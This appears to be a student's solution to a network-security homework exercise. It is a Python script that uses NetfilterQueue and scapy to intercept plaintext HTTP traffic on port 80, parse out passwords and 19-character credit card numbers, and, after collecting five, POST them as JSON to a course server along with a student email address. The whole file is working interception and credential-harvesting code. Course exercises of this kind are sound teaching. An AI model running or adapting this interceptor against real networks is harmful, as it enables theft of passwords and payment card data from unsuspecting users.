from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import json
import requests


def pwd_is_correct(s):
    for c in s:
        if c.islower():
            return False
    return True

def cc_is_correct(s):
    return len(s) == 19

def put(sset, key):
    if not key in sset:
        sset.add(key)
    return sset
        

def print_and_accept(pkt, secrets = set()):
    # get ip
    raw = pkt.get_payload()
    ip = IP(raw)

    if ip.haslayer(TCP):
        tcp = ip.getlayer(TCP)

        if tcp.dport == 80 and ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            # parse http
            splitted = http.split("\n")
            data = splitted[-1]
            parsed = data.split(" ")
            for i in range(len(parsed)):
                if parsed[i] == "---":
                    secret = parsed[i + 1]
                    stype = parsed[i - 1]
                    if stype == "pwd" and pwd_is_correct(secret):
                        #print("correct_pwd:", secret)
                        secrets = put(secrets, secret)
                    elif stype == "cc" and cc_is_correct(secret):
                        #print("correct_cc:", secret)
                        secrets = put(secrets, secret)
                    break
            if len(secrets) == 5:
                dic =	{"student_email": "serif.serbest@epfl.ch",
                         "secrets": list(secrets)}
                #print(dic)
                header = {'User-Agent': 'Dump Generator',
                          'Content-Length': str(len(json.dumps(dic))),
                          'Host': 'com403.epfl.ch',
                          'Content-Type': 'application/json'}
                #print(header)
                r = requests.post('http://com402.epfl.ch/hw1/ex4/sensitive', headers= header, data=json.dumps(dic))
                print(r.text)	
            
            	
    pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Exception occured')

nfqueue.unbind()


